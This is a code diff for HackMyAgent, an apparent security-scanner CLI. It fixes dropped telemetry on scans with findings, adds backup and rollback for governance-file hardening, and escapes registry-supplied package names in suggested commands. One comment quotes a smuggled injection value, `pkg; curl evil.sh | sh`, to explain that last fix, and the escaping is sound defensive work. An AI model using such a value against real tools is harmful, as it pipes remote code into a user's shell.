@@ -78,6 +78,67 @@ import type { TelemetryAction } from '@opena2a/cli-ui' with { 'resolution-mode':
 const TELEMETRY_TOOL = 'hackmyagent';
 // Subcommands not tracked: pure config / self-referential commands.
 const NON_TRACKED_TELEMETRY_COMMANDS = new Set<string>(['telemetry', 'help']);
+
+/**
+ * How long a command will wait for its telemetry post before giving up (#297).
+ *
+ * Telemetry must never be the reason a scan is slow, and it must never be the
+ * reason one hangs — so the wait is bounded and the timer is `unref`'d.
+ */
+const TELEMETRY_FLUSH_MS = 750;
+
+/** The command currently running, for the finish chokepoint below. */
+let currentCommandName: string | undefined;
+/** Set once the event has been posted, so it is never sent twice. */
+let telemetryTracked = false;
+/** Installed by the telemetry wiring, which is where `tele` is in scope. */
+let postTelemetry: ((name: string, startedAt: number, exitCode: number) => Promise<void>) | undefined;
+
+/**
+ * Post the command event, at most once, waiting no longer than the flush bound.
+ *
+ * Never throws and never rejects: a telemetry failure is not a scan failure.
+ */
+async function recordTelemetry(exitCode: number): Promise<void> {
+  const name = currentCommandName;
+  if (!name || telemetryTracked) return;
+  const startedAt = telemetryStartedAt.get(name);
+  if (startedAt === undefined) return;
+  telemetryTracked = true;
+  telemetryStartedAt.delete(name);
+  if (!postTelemetry) return;
+  await Promise.race([
+    postTelemetry(name, startedAt, exitCode).catch(() => { /* never fails a scan */ }),
+    new Promise<void>((resolve) => setTimeout(resolve, TELEMETRY_FLUSH_MS).unref()),
+  ]);
+}
+
+/**
+ * The one place a scan command ends when it found something (#297).
+ *
+ * Every findings-bearing branch used to call `process.exit(1)`, which
+ * terminates the process before Commander runs `postAction` — and `postAction`
+ * is where the telemetry event fires. Measured on `aef68fd`: `--json` set
+ * `process.exitCode` and its event was emitted; text, SARIF, HTML and ASFF each
+ * hard-exited and emitted nothing. So the default human-facing mode reported
+ * only CLEAN scans, and any "scans run" figure was biased toward the tool
+ * finding nothing.
+ *
+ * The mechanical `process.exit(1)` -> `process.exitCode = 1` is not enough on
+ * its own, because the hook posted with `void tele.track(...)` — fire and
+ * forget, so even on the one path that reached it the request could lose the
+ * race with process teardown. This awaits the post (bounded) and then sets the
+ * code, so the branches share one ending instead of five.
+ *
+ * Returning rather than exiting also removes the truncation hazard the hard
+ * exit carried: `process.stdout.write` is async, which is why `writeLargeStdout`
+ * exists and why #344 moved `rollback` off `process.exit` after measuring a
+ * report cut at ~15% of its length on a pipe.
+ */
+async function finishWithFindings(code: number): Promise<void> {
+  await recordTelemetry(code);
+  process.exitCode = code;
+}
 // Per-invocation start times keyed by subcommand name (preAction → postAction).
 const telemetryStartedAt = new Map<string, number>();
 import { getTaxonomyMap, getCheckCounts } from './hardening/taxonomy';
@@ -89,10 +150,13 @@ import {
   quickScanScopeDisclosure,
 } from './ui/quick-scan-labels';
 import { reconcileArtifactIntents, rawIntentDisclosureLines } from './ui/artifact-intent';
-import { clampDisclosure, clampScoreToVerdictBand, countsAgainstScore } from './ui/verdict-band';
+import { clampDisclosure, clampScoreToVerdictBand, countsAgainstScore, retainForVerdict } from './ui/verdict-band';
 import { shouldPrintVersionFooter } from './ui/version-footer';
 import { soulScopeDisclosureLines } from './ui/soul-scope-disclosure';
+import { fixSummaryLine } from './ui/fix-summary';
+import { shouldShowDeepProgress } from './ui/progress-gate';
 import { generateVerifyCommand } from './ui/verify-command';
+import { commandSucceeded } from './telemetry/command-success';
 import { escapeForDisplay, escapePathForDisplay } from './ui/display-safe';
 import { shellQuote, citationPath, citationTarget } from './ui/shell-quote';
 import { CONCEPT_EXPLAINERS, inferConceptFromFix } from './ui/concept-explainers';
@@ -905,7 +969,17 @@ function paintNotFoundTone(tone: NotFoundTone, s: string): string {
   return s;
 }
 
-/** Next-steps CTAs for the registry-only render path. */
+/**
+ * Next-steps CTAs for the registry-only render path.
+ *
+ * #273, second class — `registry.name` is REMOTE data. Every other site in that
+ * issue splices a path out of the local tree; this one splices a name the
+ * Registry served, into a command the reader is invited to paste. An entry
+ * called `pkg; curl evil.sh | sh` produced exactly that. `<name>` is the
+ * fallback for a name that cannot be shown truthfully, on the same reasoning as
+ * `citationTarget`'s `<dir>`: a placeholder stays a correct instruction, and a
+ * command naming bytes the reader cannot see does not.
+ */
 function buildRegistryCheckCtas(registry: RegistryTrustData): NextStepsCta[] {
   const ctas: NextStepsCta[] = [];
   const normalized = normalizeTrustVerdict(registry.verdict);
@@ -915,13 +989,13 @@ function buildRegistryCheckCtas(registry: RegistryTrustData): NextStepsCta[] {
   if (isUnscanned || registry.trustLevel <= 2 || normalized === 'blocked' || normalized === 'warning') {
     ctas.push({
       label: 'Fresh scan',
-      command: `${CLI_PREFIX} check ${registry.name}`,
+      command: `${CLI_PREFIX} check ${citationPath(registry.name) ?? '<name>'}`,
       primary: true,
     });
   } else {
     ctas.push({
       label: 'Fresh scan',
-      command: `${CLI_PREFIX} check ${registry.name}`,
+      command: `${CLI_PREFIX} check ${citationPath(registry.name) ?? '<name>'}`,
       primary: true,
     });
   }
@@ -3684,7 +3758,7 @@ Examples:
           // recomputed from a list the unverified fix had been removed from.
           const projectType = result.projectType || 'library';
           result.findings = refiltered.filter((f: any) =>
-            (!f.passed || f.fixed) && f.file && scanner.findingAppliesTo(f, projectType)
+            retainForVerdict(f) && f.file && scanner.findingAppliesTo(f, projectType)
           ) as typeof result.findings;
         }
         // Re-apply CLI --ignore list (reapplyIgnoreFilters only covers .hmaignore file rules)
@@ -4005,7 +4079,7 @@ Examples:
           return;
         }
         const critHigh = result.findings.filter((f: SecurityFinding) => countsAgainstScore(f) && (f.severity === 'critical' || f.severity === 'high'));
-        if (critHigh.length > 0) process.exitCode = 1;
+        if (critHigh.length > 0) await finishWithFindings(1);
         return;
       }
 
@@ -4019,7 +4093,7 @@ Examples:
           writeLargeStdout(output + '\n');
         }
         const critHigh = result.findings.filter((f: SecurityFinding) => countsAgainstScore(f) && (f.severity === 'critical' || f.severity === 'high'));
-        if (critHigh.length > 0) process.exit(1);
+        if (critHigh.length > 0) await finishWithFindings(1);
         return;
       }
 
@@ -4032,7 +4106,7 @@ Examples:
           console.log(output);
         }
         const critHigh = result.findings.filter((f: SecurityFinding) => countsAgainstScore(f) && (f.severity === 'critical' || f.severity === 'high'));
-        if (critHigh.length > 0) process.exit(1);
+        if (critHigh.length > 0) await finishWithFindings(1);
         return;
       }
 
@@ -4051,7 +4125,7 @@ Examples:
           console.log(output);
         }
         const critHigh = result.findings.filter((f: SecurityFinding) => countsAgainstScore(f) && (f.severity === 'critical' || f.severity === 'high'));
-        if (critHigh.length > 0) process.exit(1);
+        if (critHigh.length > 0) await finishWithFindings(1);
         return;
       }
 
@@ -4069,11 +4143,32 @@ Examples:
           const { SoulScanner } = await import('./soul/scanner.js');
           const { createHash } = await import('node:crypto');
           const { readFileSync } = await import('node:fs');
-          const soulPath = require('path').join(targetDir, 'SOUL.md');
-          let soulHashBefore: string | null = null;
-          try { soulHashBefore = createHash('sha256').update(readFileSync(soulPath)).digest('hex'); } catch { /* SOUL.md may not exist yet */ }
           const soulScanner = new SoulScanner();
-          const hardenResult = await soulScanner.hardenSoul(targetDir, { dryRun: false });
+          // #271 — hash the file harden-soul will ACTUALLY target, not `SOUL.md`.
+          // `findGovernanceFile()` returns any of ten governance artifacts, and
+          // the pre-hash was hardcoded to one of them, so a repo governed by
+          // `.cursorrules` got a "restores the previous SOUL.md (hash: ...)"
+          // line naming a file that was never touched, with a hash of nothing.
+          const govTarget = soulScanner.findGovernanceFile(targetDir)
+            ?? require('path').join(targetDir, 'SOUL.md');
+          let soulHashBefore: string | null = null;
+          try { soulHashBefore = createHash('sha256').update(readFileSync(govTarget)).digest('hex'); } catch { /* the governance file may not exist yet */ }
+          const hardenResult = await soulScanner.hardenSoul(targetDir, {
+            dryRun: false,
+            // The governance write is gated by the same recoverability rule as
+            // every fix write inside the scan (#271). `scanner` still holds this
+            // run's backup context — harden-soul runs after `scan()` returns.
+            writeGuard: (rel: string) => scanner.ensureGovernanceBackup(targetDir, rel),
+          });
+          if (hardenResult.writeRefused) {
+            // Never silent. A refused write with a composed section list is the
+            // shape of report this repo has spent six rounds removing.
+            process.stderr.write(
+              `\nGovernance auto-fix: NOT applied to ${escapePathForDisplay(hardenResult.writeRefused.path)}\n`
+              + `  ${hardenResult.writeRefused.reason}\n`
+              + `  The file is unchanged and the governance findings above still stand.\n\n`,
+            );
+          }
           if (hardenResult.sectionsAdded && hardenResult.sectionsAdded.length > 0) {
             process.stderr.write(`\nGovernance auto-fix: harden-soul applied\n`);
             process.stderr.write(`  + ${hardenResult.sectionsAdded.length} section(s) added to ${escapePathForDisplay(hardenResult.file ?? 'SOUL.md')}`);
@@ -4102,10 +4197,15 @@ Examples:
             // an escaped path names a different file (#343), and pasting an
             // unescaped one runs whatever the directory is called.
             const govRollback = citationTarget(displayDir);
+            // #271 — name the file that was actually written. This said
+            // "SOUL.md" for all ten governance artifacts, so the one sentence
+            // telling the user what rollback would give them back named the
+            // wrong file whenever the repo was governed by anything else.
+            const govName = escapePathForDisplay(hardenResult.file ?? 'SOUL.md');
             process.stderr.write(
               soulHashBefore
-                ? `  Rollback: \`${CLI_PREFIX} rollback ${govRollback}\` restores the previous SOUL.md (hash: ${soulHashBefore.slice(0, 8)}...)\n`
-                : `  Rollback: \`${CLI_PREFIX} rollback ${govRollback}\` removes the generated SOUL.md (kept if you edit it first)\n`,
+                ? `  Rollback: \`${CLI_PREFIX} rollback ${govRollback}\` restores the previous ${govName} (hash: ${soulHashBefore.slice(0, 8)}...)\n`
+                : `  Rollback: \`${CLI_PREFIX} rollback ${govRollback}\` removes the generated ${govName} (kept if you edit it first)\n`,
             );
             process.stderr.write('\n');
           }
@@ -4176,15 +4276,9 @@ Examples:
         // proven not to have landed still opened in green with "Fixed 1
         // issue:". Lead with what was confirmed; a run with nothing confirmed
         // does not get to claim a repair.
-        const attempted = fixedFindings.length;
-        const plural = attempted === 1 ? '' : 'es';
-        console.log(
-          unverifiedCount === 0
-            ? `${colors.green}Fixed ${attempted} issue${attempted === 1 ? '' : 's'}${verifiedCount > 0 ? ` (${verifiedCount} verified)` : ''}:${RESET()}`
-            : verifiedCount === 0
-              ? `${colors.yellow}Attempted ${attempted} fix${plural}, none confirmed:${RESET()}`
-              : `${colors.yellow}Attempted ${attempted} fix${plural} — ${verifiedCount} verified, ${unverifiedCount} not confirmed:${RESET()}`
-        );
+        const summary = fixSummaryLine(fixedFindings.length, verifiedCount, unverifiedCount);
+        const summaryColor = summary.tone === 'confirmed' ? colors.green : colors.yellow;
+        console.log(`${summaryColor}${summary.text}${RESET()}`);
         for (const finding of fixedFindings) {
           // #324 — every rendered path is scanned-tree data.
           const location = escapeForDisplay(finding.file ? (finding.line ? `${finding.file}:${finding.line}` : finding.file) : '');
@@ -4427,13 +4521,13 @@ Examples:
 
       // Exit with non-zero if critical/high issues remain (or any issues in --ci mode)
       if (options.ci && issues.length > 0) {
-        process.exit(1);
+        return finishWithFindings(1);
       }
       const criticalOrHigh = issues.filter(
         (f: SecurityFinding) => f.severity === 'critical' || f.severity === 'high'
       );
       if (criticalOrHigh.length > 0) {
-        process.exit(1);
+        return finishWithFindings(1);
       }
     } catch (error) {
       console.error(`Error: ${escapeForDisplay(error instanceof Error ? error.message : 'Unknown error')}`);
@@ -7160,8 +7254,13 @@ Examples:
       // the canonical hardened-prose SOUL — and printed nothing until it
       // finished, reading as a hang. TTY-only so JSON and CI logs are
       // byte-unaffected, same gate as the `wild` counter (#253).
-      const showDeepProgress = !!options.deep && !options.json && !globalCiMode
-        && !options.ci && process.stderr.isTTY;
+      const showDeepProgress = shouldShowDeepProgress({
+        deep: options.deep,
+        json: options.json,
+        ci: options.ci,
+        ciMode: globalCiMode,
+        isTty: process.stderr.isTTY,
+      });
       const result = await scanner.scanSoul(targetDir, {
         verbose: options.verbose,
         tier: options.tier,
@@ -7640,7 +7739,39 @@ Examples:
 
       const prefix = getCommandPrefix();
       const scanner = new SoulScanner();
-      const result = await scanner.hardenSoul(targetDir, { dryRun: options.dryRun, profile: options.profile });
+
+      // #271 — a real write gets a real backup. This command rewrote a
+      // governance file (measured: `.cursorrules` 113 -> 19055 bytes) and took
+      // no backup, so `rollback` restored a previous run's manifest and
+      // reported a clean revert having never heard of the file that changed.
+      //
+      // Only for an actual write: `--dry-run` modifies nothing, and creating a
+      // backup directory for it would be a side effect of a preview.
+      let hardenBackup: string | null = null;
+      let hardenGuard: ((rel: string) => Promise<boolean>) | undefined;
+      if (!options.dryRun) {
+        const { HardeningScanner } = await import('./hardening/scanner.js');
+        const hardening = new HardeningScanner();
+        hardenBackup = await hardening.beginExternalBackup(targetDir);
+        if (hardenBackup === null) {
+          // Fail closed, like `scan()` does when its backup cannot be taken.
+          process.stderr.write(
+            `\nharden-soul did NOT modify anything.\n`
+            + `  No backup could be taken in ${escapePathForDisplay(targetDir)}, and hardening a `
+            + `governance file with nothing to roll back to is not something HackMyAgent will do.\n`
+            + `  Make the directory writable and re-run.\n\n`,
+          );
+          process.exitCode = 1;
+          return;
+        }
+        hardenGuard = (rel: string) => hardening.ensureGovernanceBackup(targetDir, rel);
+      }
+
+      const result = await scanner.hardenSoul(targetDir, {
+        dryRun: options.dryRun,
+        profile: options.profile,
+        writeGuard: hardenGuard,
+      });
 
       // JSON output
       if (options.json) {
@@ -7651,8 +7782,26 @@ Examples:
           controlsAdded: result.controlsAdded,
           dryRun: result.dryRun,
           existedBefore: result.existedBefore,
+          // #270/#271 — a consumer that only reads `sectionsAdded` would see an
+          // empty list and conclude the file was already compliant. The refusal
+          // is the reason it is empty, so it travels in the machine output too.
+          ...(result.writeRefused ? { writeRefused: result.writeRefused } : {}),
         };
         writeJsonStdout(jsonResult);
+        if (result.writeRefused) process.exitCode = 1;
+        return;
+      }
+
+      // #270/#271 — the write was refused. Say so before anything that could be
+      // read as "this ran". Nothing was modified, so exit non-zero: a script
+      // treating exit 0 as "governance is now hardened" would be wrong.
+      if (result.writeRefused) {
+        process.stderr.write(
+          `\nharden-soul did NOT modify ${escapePathForDisplay(result.writeRefused.path)}\n`
+          + `  ${result.writeRefused.reason}\n`
+          + `  The file is unchanged.\n\n`,
+        );
+        process.exitCode = 1;
         return;
       }
 
@@ -7700,6 +7849,12 @@ Examples:
           console.log(`  ${colors.cyan}Apply:${RESET()}   ${prefix} harden-soul ${citationTarget(directory)}`);
         }
         console.log(`  ${colors.cyan}Verify:${RESET()}  ${prefix} scan-soul ${citationTarget(directory)}`);
+        // #271 — the undo path, stated where the change is reported. This
+        // command rewrote a governance file and said nothing about how to get
+        // the previous one back, because there was no way to.
+        if (!result.dryRun && hardenBackup) {
+          console.log(`  ${colors.cyan}Undo:${RESET()}    ${prefix} rollback ${citationTarget(directory)}`);
+        }
         console.log();
       }
     } catch (error) {
@@ -9923,7 +10078,7 @@ async function checkGitHubRepo(
       const refiltered = await scanner.reapplyIgnoreFilters(nmResult.mergedFindings, repoDir);
       const projectType = result.projectType || 'library';
       result.findings = refiltered.filter((f: any) =>
-        (!f.passed || f.fixed) && f.file && scanner.findingAppliesTo(f, projectType)
+        retainForVerdict(f) && f.file && scanner.findingAppliesTo(f, projectType)
       ) as typeof result.findings;
       scanner.applyScore(result, result.findings.filter((f: any) => countsAgainstScore(f)));
       analystFindings = nmResult.analystFindings;
@@ -10232,7 +10387,7 @@ async function checkPyPiPackage(
       const refiltered = await scanner.reapplyIgnoreFilters(nmResult.mergedFindings, extractDir);
       const projectType = result.projectType || 'library';
       result.findings = refiltered.filter((f: any) =>
-        (!f.passed || f.fixed) && f.file && scanner.findingAppliesTo(f, projectType)
+        retainForVerdict(f) && f.file && scanner.findingAppliesTo(f, projectType)
       ) as typeof result.findings;
       scanner.applyScore(result, result.findings.filter((f: any) => countsAgainstScore(f)));
       analystFindings = nmResult.analystFindings;
@@ -10435,7 +10590,7 @@ async function checkRawUrl(
       const refiltered = await scanner.reapplyIgnoreFilters(nmResult.mergedFindings, scanDir);
       const projectType = result.projectType || 'library';
       result.findings = refiltered.filter((f: any) =>
-        (!f.passed || f.fixed) && f.file && scanner.findingAppliesTo(f, projectType)
+        retainForVerdict(f) && f.file && scanner.findingAppliesTo(f, projectType)
       ) as typeof result.findings;
       scanner.applyScore(result, result.findings.filter((f: any) => countsAgainstScore(f)));
       analystFindings = nmResult.analystFindings;
@@ -10611,7 +10766,7 @@ async function checkNpmPackage(
       const refiltered = await scanner.reapplyIgnoreFilters(nmResult.mergedFindings, packageDir);
       const projectType = result.projectType || 'library';
       result.findings = refiltered.filter((f: any) =>
-        (!f.passed || f.fixed) && f.file && scanner.findingAppliesTo(f, projectType)
+        retainForVerdict(f) && f.file && scanner.findingAppliesTo(f, projectType)
       ) as typeof result.findings;
       scanner.applyScore(result, result.findings.filter((f: any) => countsAgainstScore(f)));
       analystFindings = nmResult.analystFindings;
@@ -10935,21 +11090,32 @@ async function checkNpmPackage(
 
       const name = actionCommand.name();
       if (NON_TRACKED_TELEMETRY_COMMANDS.has(name)) return;
+      currentCommandName = name;
       telemetryStartedAt.set(name, Date.now());
     })
-    .hook('postAction', (_thisCommand, actionCommand) => {
-      const name = actionCommand.name();
-      const startedAt = telemetryStartedAt.get(name);
-      if (startedAt === undefined) return;
-      telemetryStartedAt.delete(name);
-      void tele.track(name, {
-        // Exit 1 = findings detected (security-tool convention — see
-        // line ~3535 where critHigh.length > 0 sets exitCode=1). The
-        // command did its job. Only exit >=2 is a real crash.
-        success: tele.successFromExitCode(process.exitCode),
-        durationMs: Date.now() - startedAt,
-      });
+    .hook('postAction', async () => {
+      // The clean-exit path. A findings-bearing branch has already gone through
+      // `finishWithFindings`, and `recordTelemetry` is once-only, so this is a
+      // no-op there rather than a second event.
+      // `process.exitCode` is typed `string | number | undefined` — Node allows
+      // a string alias like 'SIGINT'. Anything that is not a number is not an
+      // exit STATUS, so it is normalised to 0 here rather than parsed.
+      await recordTelemetry(typeof process.exitCode === 'number' ? process.exitCode : 0);
     });
+
+  // Installed here because this is where `tele` is in scope. `postTelemetry` is
+  // the only thing that knows how to build the event; `recordTelemetry` owns
+  // when it fires and how long anyone waits for it.
+  postTelemetry = async (name, startedAt, exitCode) => {
+    await tele.track(name, {
+      // Exit 1 normally means "findings were detected and the command did its
+      // job", which is the security-tool convention `successFromExitCode`
+      // encodes. `rollback` is the exception (#350): there exit 1 means the
+      // user's files did not all come back, so only 0 is a success.
+      success: commandSucceeded(name, exitCode, tele.successFromExitCode),
+      durationMs: Date.now() - startedAt,
+    });
+  };
 
   // Telemetry subcommand: inspect or toggle anonymous usage telemetry.
   program
